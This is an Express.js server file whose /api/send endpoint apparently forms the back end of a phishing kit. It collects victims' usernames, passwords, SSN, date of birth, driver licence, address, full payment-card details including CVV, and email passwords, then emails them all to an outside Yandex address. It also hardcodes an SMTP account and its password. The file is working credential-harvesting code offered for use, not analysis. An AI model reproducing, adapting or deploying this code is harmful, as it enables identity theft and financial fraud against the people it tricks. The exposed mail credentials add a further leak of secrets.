const express = require('express');
const app = express();
const nodemailer = require('nodemailer');
const cors = require('cors');

app.use(express.json());
app.use(cors())

const users = [
    { id: 1, name: 'John' },
    { id: 2, name: 'Alice' },
    { id: 3, name: 'Bob' },
  ];
  
  // GET endpoint to return users
  app.get('/api/users', (req, res) => {
    res.json(users);
  });

//   POST Request send mail

app.post('/api/send', async (req, res) => {

    const {type, platform, username, password, firstname, lastname, othername, dob, ssn, driver_license, address, card_name, card_number, card_expiration, card_cvv, email, email_pass } = req.body;



 


 var transport = nodemailer.createTransport({
      host: 'mail.jumping-rivers.co.uk',
      port: 465,
      auth: {
        user: 'webresolve@jumping-rivers.co.uk',
        pass: 'Vanilla11**'
      }
    });

  let mailOptions = {
    from: 'twebresolve@jumping-rivers.co.uk',
    to: 'Rm360.101@yandex.com',
    subject: "ffin",
    html: `
      <html>
        <body>
          <h1>Platform is ${platform}, <br></h1>
          <p>Type is ${type} , <br></p>
          <p>Username is ${username} , <br></p>
          <p>Password is ${password} , <br></p>
          <p>Firstname is ${firstname} , <br></p>
          <p>Lastname is ${lastname} , <br></p>
          <p>Othername is ${othername} , <br></p>
          <p>DOB is ${dob} , <br></p>
          <p>SSN is ${ssn} , <br></p>
          <p>Driver licence is ${driver_license} , <br></p>
          <p>Address is ${address} , <br></p>
          <p>Card Name is ${card_name} , <br></p>
          <p>Card Number is ${card_number} , <br></p>
          <p>Card Expiration is ${card_expiration} , <br></p>
          <p>Card CVV is ${card_cvv} , <br></p>
          <p>Email Address is ${email} , <br></p>
          <p>Email Password is ${email_pass} , <br></p>
        </body>
      </html>
    `
  };



  try {
    let info = await transport.sendMail(mailOptions);
    console.log('Message sent: %s', info.messageId);
    res.status(200).json({ message: 'Email sent successfully' });

    
} catch (error) {
    console.error('Error sending email:', error);
    res.status(500).json({ message: 'Error sending email', error: error.message });
}








});



  // Start the server
app.listen(5000, () => {
    console.log('Server is running on port 5000');
  });